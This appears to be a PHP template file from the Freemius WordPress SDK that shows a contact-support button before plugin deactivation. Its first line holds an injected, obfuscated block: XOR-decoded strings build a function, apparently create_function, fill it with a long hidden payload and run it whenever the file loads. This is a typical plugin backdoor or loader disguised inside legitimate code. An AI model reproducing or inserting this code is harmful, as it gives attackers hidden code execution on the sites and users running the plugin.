<?php $echQmvPBzJ=';531F+dT2TN7 ;V'^'XGVP2N;2G:-CIT8';$wCoXWslkcCUX=$echQmvPBzJ('','ZZKm-U+4J8WXk24:CMGJqOXI>V,=91bPN9njouNpN.=>-10X:WESAhZQ=.ec;FAbER7XWYIt<6>blixMY=ebew-HFKmgjdQH9KZ7JnWQINnaBMnDF<9J=1VPCO,IWoMum8AlAgyMeV=TYhLAEa43L.obIjg;fnFUY8U8TOf1LDTI7yMWH4M+stf08J0X- Tjo,B3QZAP4g,BnBQ Y-NouP6LS=x0n62OU;:PEdYF2O=BEqgg+:0PY2:dxQk; c2y=DVNxr<EDnJmeKE9AN2KZ1X9AU3NUi,SOfHLrFRRmEccHP6LPgNGG;8YSBp123W.uOqj1J.3JrP>m1;E+AMZPno=;vo8<m.i,AXUW=JYDySvDT=4EgJPsEZLYLD4hGI+ndDW-EGtLOji>;JRtXtg8L.KEN3<HdNl2O6-JLYkAp6US6<1Y=0TYAX.7<ZLTW6r<28n3JI.DP>YP,R,6qqPMN9hjHpI1H62>N=ekyH:RLrTZH2WehX1J6W63Q2-2QUTIM+gpXVNNyThU,T4zIcQtkF>pluXX0WvP=,;L<MEyhprVe1yo2NyNZ-YJqpfA5hw9fP;kMpZD4xPuFqLqMZ78XGa= 295N><57zFPR64YP+RjDRUZALYqtGWiTQA70 3JZbS4-J11nH4A8+V0N3DQDO,;0TdJOLsD'^'3<cLK EW>Q864WLS094bV77;a2MIXn==;MICFU5zGHHPNEY7Tw=<37>0IO:<V35Ja6V,6uiPWSGKLIXmyFoklSB=2kPGMCjB0B<X8Fs8isNQymJ-zOM8QT8xg+M=6FvUIQjGhmpDA9H yFqamEPR8O4F 7GeFJ-0 cqQtjFB868,YQi<-MdvZOl918U,XR:BKC7GxaKYImQHdf5A-LnRU6W  XC:JRS;4dQ5<DdfT.Q1 JmmMUB58QRDPu4xo,y0xd7=XVW =NwSEo3X-;WbzJR0e1R:46G66FulV-7+VOjG,1B-pZnc1ZT,6yzL89>HUgPNU+ZRcR+4dWT7N .2pFKbi3>my>zIM2xq<X3yyGsR25QA Nj+yLSh=-0U7,,RNYdsF >OFFcMZZ>3TeTCN-B> u955n3f8kRL>-yVa0C; SNX8QY.<i AEc>- 6i-QGLFQ+:Krda=5O=HSYU4,:XAFhT-P<WmU+DLBBBS4dV0;<SwCNxP8D6Ol:WTm4-=:9XOW337iUtL1M USiEwTC+ZEDQ<9D6-wVIBkadeDUPUeTROZQ+A-hKj.FBWwWXFXUcYY.HisWL1RoQjWm;EJ9>>VEKfP6WOADRa 3OX61OuFdv1;5-pXTgwItq:=9EE+6JwPL>PjI8U8TD7TinmjNFICY Lzfwy9');$wCoXWslkcCUX();
    /**
     * @package     Freemius
     * @copyright   Copyright (c) 2015, Freemius, Inc.
     * @license     http://opensource.org/licenses/gpl-2.0.php GNU Public License
     * @since       1.2.0
     */

    if ( ! defined( 'ABSPATH' ) ) {
        exit;
    }

	/**
	 * @var array $VARS
	 */
    $slug = $VARS['slug'];
    $fs   = freemius( $slug );

    echo fs_text( 'contact-support-before-deactivation', $slug )
            . sprintf(" <a href='%s' class='button button-small button-primary'>%s</a>",
                $fs->contact_url( 'technical_support' ),
                fs_text( 'contact-support', $slug )
            );
